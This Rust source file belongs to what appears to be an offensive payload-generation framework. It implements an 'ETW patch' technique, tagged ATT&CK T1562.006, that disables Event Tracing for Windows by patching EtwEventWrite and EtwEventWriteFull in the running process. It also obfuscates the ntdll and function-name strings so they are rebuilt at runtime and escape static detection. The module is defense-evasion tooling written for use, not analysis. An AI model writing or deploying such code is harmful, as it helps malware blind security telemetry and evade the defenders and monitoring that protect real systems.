//! ETW patch.
//!
//! Patches `EtwEventWrite` (and, optionally, `EtwEventWriteFull`) in the current
//! process so ETW providers stop emitting events. A Preparation technique: it
//! modifies the process state and never runs the payload. See `README.md` for
//! the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for the ETW patch.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Also patch `EtwEventWriteFull`, the variant that most script and .NET
    /// telemetry actually calls. Best effort: if the export cannot be patched,
    /// the main patch still stands.
    #[serde(default = "default_full")]
    pub full: bool,
}

/// Default for [`Params::full`]: patch the Full variant too.
pub fn default_full() -> bool {
    true
}

/// Static metadata for the ETW patch.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "patch_etw",
    attck: &["T1562.006"],
    stability: Stability::Stable,
    requires: &[Capability::WindowsX64],
    conflicts: &[],
    category: Category::Preparation,
    doc_path: "src/techniques/patch_etw/README.md",
    readme: include_str!("README.md"),
    stub_fragment: include_str!("stub_fragment.rs"),
    params_example: "technique: patch_etw\nfull: true\n",
    // patch_etw still uses LoadLibraryA/GetProcAddress/VirtualProtect directly;
    // it will migrate to the Nt* helpers in a later phase.
    syscalls: &[],
    resolves_imports: false,
};

impl Params {
    /// Renders the ETW-patch stub fragment, obfuscating the `ntdll.dll`,
    /// `EtwEventWrite` and `EtwEventWriteFull` literals through `strings` so
    /// they are rebuilt at runtime, and baking in whether the Full variant is
    /// patched too.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let etw_dll = strings.obfuscate("ntdll.dll").render_stub_expr("etw_dll");
        let etw_func = strings
            .obfuscate("EtwEventWrite")
            .render_stub_expr("etw_func");
        let etw_full_func = strings
            .obfuscate("EtwEventWriteFull")
            .render_stub_expr("etw_full_func");
        DEF.stub_fragment
            .replace("$ETW_DLL_DEF$", &etw_dll)
            .replace("$ETW_FUNC_DEF$", &etw_func)
            .replace("$ETW_FULL_FUNC_DEF$", &etw_full_func)
            .replace("$PATCH_FULL$", if self.full { "true" } else { "false" })
    }
}

#[cfg(test)]
mod tests;
